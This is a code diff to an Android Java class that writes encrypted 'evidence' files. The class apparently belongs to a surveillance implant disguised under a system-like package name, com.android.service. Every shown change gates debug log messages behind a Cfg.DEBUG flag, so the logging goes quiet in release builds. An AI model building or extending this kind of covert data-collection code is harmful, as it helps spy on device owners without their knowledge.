@@ -16,6 +16,7 @@ import android.util.Log;
 
 import com.android.service.Device;
 import com.android.service.LogR;
+import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
 import com.android.service.crypto.Encryption;
 import com.android.service.crypto.Keys;
@@ -171,7 +172,7 @@ public final class Evidence {
 			if (firstSpace) {
 				firstSpace = false;
 
-				Log.d("QZ", TAG + " FATAL: not enough space. Free : " + free);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " FATAL: not enough space. Free : " + free);
 			}
 			return false;
 		} else {
@@ -243,7 +244,7 @@ public final class Evidence {
 
 		enoughSpace = enoughSpace();
 		if (!enoughSpace) {
-			Log.d("QZ", TAG + " createEvidence, no space");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " createEvidence, no space");
 			return false;
 		}
 
@@ -256,7 +257,7 @@ public final class Evidence {
 		final boolean ret = Path.createDirectory(dir);
 
 		if (!ret) {
-			Log.d("QZ", TAG + " Error: Dir not created: " + dir);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: Dir not created: " + dir);
 			return false;
 		}
 
@@ -270,10 +271,10 @@ public final class Evidence {
 
 			if (fconn.exists()) {
 				close();
-				Log.d("QZ", TAG + " FATAL: It should not exist:" + fileName);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " FATAL: It should not exist:" + fileName);
 				return false;
 			}
-			Log.d("QZ", TAG + " Created " + evidenceType + " : "
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Created " + evidenceType + " : "
 					+ name.fileName);
 			final byte[] plainBuffer = makeDescription(additionalData,
 					evidenceType);
@@ -289,11 +290,11 @@ public final class Evidence {
 			fconn.append(encBuffer);
 			Check.asserts(fconn.getSize() == encBuffer.length + 4,
 					"Wrong filesize");
-			// Log.d("QZ", TAG + " additionalData.length: " +
+			// if(AutoConfig.DEBUG) Log.d("QZ", TAG + " additionalData.length: " +
 			// plainBuffer.length);
-			// Log.d("QZ", TAG + " encBuffer.length: " + encBuffer.length);
+			// if(AutoConfig.DEBUG) Log.d("QZ", TAG + " encBuffer.length: " + encBuffer.length);
 		} catch (final Exception ex) {
-			Log.d("QZ", TAG + " Error: file: " + name.fileName + " ex:" + ex);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: file: " + name.fileName + " ex:" + ex);
 			return false;
 		}
 
@@ -395,7 +396,7 @@ public final class Evidence {
 		encData = encryption.encryptData(data, offset);
 
 		if (fconn == null) {
-			Log.d("QZ", TAG + " Error: fconn null");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: fconn null");
 			return false;
 		}
 
@@ -404,7 +405,7 @@ public final class Evidence {
 			fconn.append(encData);
 			fconn.flush();
 		} catch (final Exception e) {
-			Log.d("QZ", TAG + " Error: Error writing file: " + e);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: Error writing file: " + e);
 			return false;
 		}
 
@@ -459,7 +460,7 @@ public final class Evidence {
 					message, true));
 
 		} catch (final Exception ex) {
-			Log.d("QZ", TAG + " Error: " + ex.toString());
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + ex.toString());
 		}
 	}
 
